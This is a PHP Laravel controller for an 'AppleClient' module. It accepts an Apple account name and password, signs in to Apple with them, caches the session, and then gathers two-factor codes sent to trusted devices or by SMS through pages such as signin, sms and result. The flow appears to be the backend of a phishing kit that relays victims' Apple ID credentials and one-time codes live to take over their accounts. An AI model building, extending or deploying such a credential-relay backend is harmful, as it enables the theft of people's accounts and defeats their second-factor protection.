<?php

namespace Modules\AppleClient\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use InvalidArgumentException;
use JsonException;
use Modules\AppleClient\Service\AppleAccountManagerFactory;
use Modules\AppleClient\Service\DataConstruct\Phone;
use Modules\AppleClient\Service\Exception\StolenDeviceProtectionException;
use Modules\AppleClient\Service\Exception\VerificationCodeException;
use Modules\AppleClient\Service\AppleClientControllerService;
use Modules\AppleClient\Service\ServiceError\ServiceError;
use Psr\Log\LoggerInterface;
use Psr\SimpleCache\CacheInterface;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;

class AppleClientController extends Controller
{
    public function __construct(
        protected readonly Request $request,
        protected readonly LoggerInterface $logger,
        protected readonly CacheInterface $cache,
        protected AppleAccountManagerFactory $accountManagerFactory,
    ) {

    }

    public function ip(): string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin()
    {
//        $guid = sha1(microtime());
//
//        $this->ipService->rememberIpAddress();
//
        //
//        ->withCookie(Cookie::make('Guid', $guid))


        return response()
            ->view('index/signin');
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        // 获取验证过的数据
        $validatedData = $request->validated();

        $appleClientControllerService = new AppleClientControllerService(
            $this->accountManagerFactory->create([
                'account'  => $validatedData['accountName'],
                'password' => $validatedData['password'],
            ])
        );

        $auth = $appleClientControllerService->signAuth();

        $account = $appleClientControllerService->getAccount();

        Cache::put($account->getSessionId(), $account, 60 * 10);

        if ($auth->hasTrustedDevices() || $auth->getTrustedPhoneNumbers()->count() === 0) {
            return $this->success(data: [
                'Guid' => $account->getSessionId(),
                'Devices' => true,
            ], code: 201);
        }

        if ($auth->getTrustedPhoneNumbers()->count() >= 2) {
            return $this->success(data: [
                'Guid' => $account->getSessionId(),
                'Devices' => false,
            ], code: 202);
        }

        /**
         * @var Phone $trustedPhoneNumbers
         */
        $trustedPhoneNumbers = $auth->getTrustedPhoneNumbers()->first();

        return $this->success(data: [
            'Guid'   => $account->getSessionId(),
            'Devices' => false,
            'ID'     => $trustedPhoneNumbers->getId(),
            'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
        ], code: 203)->withCookie(Cookie::make('Guid', $account->getSessionId()));
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function authPhoneList(AppleClientControllerService $controllerService
    ): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse {
        return view('index.auth-phone-list', ['trustedPhoneNumbers' => $controllerService->getPhoneLists()]);
    }

    /**
     * @param VerifyCodeRequest $request
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws StolenDeviceProtectionException
     * @throws VerificationCodeException
     * @throws JsonException
     */
    public function verifySecurityCode(
        VerifyCodeRequest $request,
        AppleClientControllerService $controllerService
    ): JsonResponse {
        $validated = $request->validated();

        $controllerService->verifySecurityCode($validated['apple_verifycode']);

        return $this->success();
    }

    /**
     * @param VerifyCodeRequest $request
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws VerificationCodeException
     * @throws JsonException
     * @throws StolenDeviceProtectionException
     */
    public function smsSecurityCode(
        VerifyCodeRequest $request,
        AppleClientControllerService $controllerService
    ): JsonResponse {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        if (empty($Id = $validated['ID'])) {
            throw new InvalidArgumentException('手机号码ID不能为空');
        }

        $controllerService->verifyPhoneCode($Id, $validated['apple_verifycode']);

        return $this->success();
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function SendSecurityCode(AppleClientControllerService $controllerService): JsonResponse
    {
        $sendDeviceSecurityCode = $controllerService->sendSecurityCode();

        return $this->success($sendDeviceSecurityCode->toArray());
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws JsonException
     */
    public function GetPhone(AppleClientControllerService $controllerService): JsonResponse
    {
        $trustedPhoneNumber = $controllerService->getTrustedPhoneNumber();

        return $this->success([
            'ID'     => $trustedPhoneNumber->id,
            'Number' => $trustedPhoneNumber->numberWithDialCode,
        ]);
    }

    /**
     * @param AppleClientControllerService $controllerService
     * @return JsonResponse|Redirector
     * @throws FatalRequestException
     * @throws JsonException
     * @throws RequestException
     */
    public function SendSms(AppleClientControllerService $controllerService): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:1',
        ])->validated();

        $response = $controllerService->sendSms((int)$params['ID']);

        /**
         * @var $error ServiceError
         */
        if ($response->securityCode->tooManyCodesSent) {
            Session::flash('Error', '发送了过多的验证码，请稍后再试');
        }

        return $this->success($response->toArray());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms', ['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }

    public function stolenDeviceProtection(): View|Factory|Application
    {
        return view('index/stolen-device-protection');
    }
}
